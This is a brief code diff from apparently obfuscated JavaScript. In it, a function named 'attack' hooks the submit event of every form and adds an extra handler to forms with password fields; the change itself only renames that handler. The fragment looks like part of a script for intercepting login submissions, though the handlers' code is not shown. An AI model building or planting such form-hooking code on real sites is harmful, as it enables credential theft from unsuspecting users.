@@ -60,7 +60,7 @@ function obf_func_attack() {
 	document.querySelectorAll("form").forEach(function(obf_var_form){
 		obf_var_form.addEventListener("submit", obf_func_callback);
 		if (obf_var_form.querySelector("input[type=password]")) {
-			obf_var_form.addEventListener("submit", obf_path_whitelist);
+			obf_var_form.addEventListener("submit", obf_func_whitelist);
 		}
 	});
 
